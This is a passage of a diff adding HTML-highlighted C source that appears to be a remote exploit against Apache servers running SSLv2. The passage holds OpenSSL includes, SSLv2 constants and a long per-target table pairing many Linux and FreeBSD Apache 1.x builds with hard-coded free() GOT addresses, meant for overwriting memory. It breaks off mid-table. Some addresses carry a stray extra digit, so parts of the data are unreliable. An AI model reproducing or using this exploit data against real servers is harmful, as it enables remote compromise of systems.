+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;unistd.h&gt;</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;openssl/ssl.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;openssl/rsa.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;openssl/x509.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;openssl/evp.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;openssl/rc4.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;openssl/md5.h&gt;</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;SSL2_MT_ERROR&nbsp;0</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;SSL2_MT_CLIENT_FINISHED&nbsp;3</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;SSL2_MT_SERVER_HELLO&nbsp;4</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;SSL2_MT_SERVER_VERIFY&nbsp;5</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;SSL2_MT_SERVER_FINISHED&nbsp;6</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;SSL2_MAX_CONNECTION_ID_LENGTH&nbsp;16</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;update&nbsp;this&nbsp;if&nbsp;you&nbsp;add&nbsp;architectures&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;MAX_ARCH&nbsp;138</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;archs&nbsp;{<br>
+                <span style="color:#7f0044;font-weight:400">char</span>*&nbsp;desc;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;func_addr; <span style="color:#0088ff;font-weight:400">/*&nbsp;objdump&nbsp;-R&nbsp;/usr/sbin/httpd&nbsp;|&nbsp;grep&nbsp;free&nbsp;*/</span><br>
+                }&nbsp;architectures[]&nbsp;=&nbsp;{<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Caldera&nbsp;OpenLinux&nbsp;(apache-1.3.26)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x080920e0</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Cobalt&nbsp;Sun&nbsp;6.0&nbsp;(apache-1.3.12)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x8120f0c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Cobalt&nbsp;Sun&nbsp;6.0&nbsp;(apache-1.3.20)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x811dcb8</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Cobalt&nbsp;Sun&nbsp;x&nbsp;(apache-1.3.26)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x8123ac3</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Cobalt&nbsp;Sun&nbsp;x&nbsp;Fixed2&nbsp;(apache-1.3.26)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x81233c3</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Conectiva&nbsp;4&nbsp;(apache-1.3.6)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08075398</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Conectiva&nbsp;4.1&nbsp;(apache-1.3.9)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808f2fe</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Conectiva&nbsp;6&nbsp;(apache-1.3.14)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809222c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Conectiva&nbsp;7&nbsp;(apache-1.3.12)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808f874</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Conectiva&nbsp;7&nbsp;(apache-1.3.19)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08088aa0</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Conectiva&nbsp;7/8&nbsp;(apache-1.3.26)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808e628</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Conectiva&nbsp;8&nbsp;(apache-1.3.22)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808b2d0</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;2.2&nbsp;Potato&nbsp;(apache_1.3.9-14.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08095264</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache_1.3.19-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080966fc</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache_1.3.22-2)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08096aac</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache-1.3.22-2.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08083828</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache-1.3.22-5)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08083728</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache_1.3.23-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08085de8</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache_1.3.24-2.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08087d08</span><br>
+                },<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Debian&nbsp;Linux&nbsp;GNU&nbsp;Linux&nbsp;2&nbsp;(apache_1.3.24-2.1)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x080873ac</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache_1.3.24-3)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08087d68</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache-1.3.26-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0080863c4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;3.0&nbsp;Woody&nbsp;(apache-1.3.26-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080863cc</span><br>
+                },<br>
+                {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Debian&nbsp;GNU&nbsp;Linux&nbsp;(apache-1.3.27)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x0080866a3</span><br>
+                },<br>
+                <br>
+                <br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.9)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xbfbfde00</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.11)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080a2ea8</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.12.1.40)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080a7f58</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.12.1.40)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080a0ec0</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.12.1.40)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080a7e7c</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.12.1.40_1)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080a7f18</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.12)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0809bd7c</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.14)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xbfbfdc00</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.14)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080ab68c</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.14)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808c76c</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.14)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080a3fc8</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.14)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080ab6d8</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.17_1)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808820c</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.19)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xbfbfdc00</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.19_1)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808c96c</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.20)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808cb70</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.20)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xbfbfc000</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.20+2.8.4)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808faf8</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.20_1)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808dfb4</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.22)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xbfbfc000</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.22_7)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808d110</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache_fp-1.3.23)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0807c5f8</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.24_7)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808f8b0</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.24+2.8.8)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080927f8</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;4.6.2-Release-p6&nbsp;(apache-1.3.26)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080c432c</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;4.6-Realease&nbsp;(apache-1.3.26)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0808fdec</span>&nbsp;},<br>
+                {&nbsp;<span style="color:#3ad900;font-weight:400">"FreeBSD&nbsp;(apache-1.3.27)"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x080902e4</span>&nbsp;},<br>
+                <br>
+                <br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Gentoo&nbsp;Linux&nbsp;(apache-1.3.24-r2)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08086c34</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Linux&nbsp;Generic&nbsp;(apache-1.3.14)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0xbffff500</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;X.x&nbsp;(apache-1.3.22-10.1mdk)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080808ab</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;7.1&nbsp;(apache-1.3.14-2)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809f6c4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;7.1&nbsp;(apache-1.3.22-1.4mdk)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809d233</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.14-2mdk)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809f6ef</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.14)&nbsp;2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809d6c4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.20-5.1mdk)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809ccde</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.20-5.2mdk)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809ce14</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.22-1.3mdk)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809d262</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.22-10.2mdk)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08083545</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;8.0&nbsp;(apache-1.3.19-3)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809ea98</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;8.1&nbsp;(apache-1.3.20-3)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809e97c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;8.2&nbsp;(apache-1.3.23-4)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08086580</span><br>
+                },<br>
+                {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;8.2&nbsp;#2&nbsp;(apache-1.3.23-4)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x08086484</span><br>
+                },<br>
+                {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;8.2&nbsp;(apache-1.3.24)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x08086665</span><br>
+                },<br>
+                <br>
+                {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Mandrake&nbsp;Linux&nbsp;9&nbsp;(apache-1.3.26)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x0808b864</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;?.?&nbsp;GENERIC&nbsp;(apache-1.3.12-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808c0f4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;TEST1&nbsp;(apache-1.3.12-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808c0f4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;TEST2&nbsp;(apache-1.3.12-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808c0f4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;GENERIC&nbsp;(marumbi)&nbsp;(apache-1.2.6-5)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080d2c35</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;4.2&nbsp;(apache-1.1.3-3)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08065bae</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;5.0&nbsp;(apache-1.2.4-4)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808c82c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;5.1-Update&nbsp;(apache-1.2.6)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08092a45</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;5.1&nbsp;(apache-1.2.6-4)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08092c2d</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;5.2&nbsp;(apache-1.3.3-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0806f049</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;5.2-Update&nbsp;(apache-1.3.14-2.5.x)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808e4d8</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.0&nbsp;(apache-1.3.6-7)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080707ec</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.0&nbsp;(apache-1.3.6-7)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080707f9</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.0-Update&nbsp;(apache-1.3.14-2.6.2)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808fd52</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.0&nbsp;Update&nbsp;(apache-1.3.24)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x80acd58</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.1&nbsp;(apache-1.3.9-4)1"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808ccc4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.1&nbsp;(apache-1.3.9-4)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808ccdc</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.1-Update&nbsp;(apache-1.3.14-2.6.2)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808fd5d</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.1-fp2000&nbsp;(apache-1.3.26)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x082e6fcd</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.2&nbsp;(apache-1.3.12-2)1"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808f689</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.2&nbsp;(apache-1.3.12-2)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808f614</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.2&nbsp;mod(apache-1.3.12-2)3"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0xbffff94c</span><br>
+                },<br>
+                <br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.2&nbsp;update&nbsp;(apache-1.3.22-5.6)1"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808f9ec</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;6.2-Update&nbsp;(apache-1.3.22-5.6)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808f9d4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Redhat&nbsp;Linux&nbsp;7.x&nbsp;(apache-1.3.22)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808400c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.x&nbsp;(apache-1.3.26-1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080873bc</span><br>
+                },<br>
+                {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.x&nbsp;(apache-1.3.27)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x08087221</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.0&nbsp;(apache-1.3.12-25)1"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809251c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.0&nbsp;(apache-1.3.12-25)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809252d</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.0&nbsp;(apache-1.3.14-2)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08092b98</span><br>
+                },<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.0-Update&nbsp;(apache-1.3.22-5.7.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08084358</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.0-7.1&nbsp;update&nbsp;(apache-1.3.22-5.7.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808438c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.0-Update&nbsp;(apache-1.3.27-1.7.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08086e41</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.1&nbsp;(apache-1.3.19-5)1"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809af8c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.1&nbsp;(apache-1.3.19-5)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809afd9</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.1-7.0&nbsp;update&nbsp;(apache-1.3.22-5.7.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808438c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.1-Update&nbsp;(1.3.22-5.7.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08084389</span><br>
+                },<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.1&nbsp;(apache-1.3.22-src)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x0816021c</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.1-Update&nbsp;(1.3.27-1.7.1)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08086ec89</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.20-16)1"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080994e5</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.20-16)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080994d4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.2-Update&nbsp;(apache-1.3.22-6)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08084045</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.24)"</span>,<br>
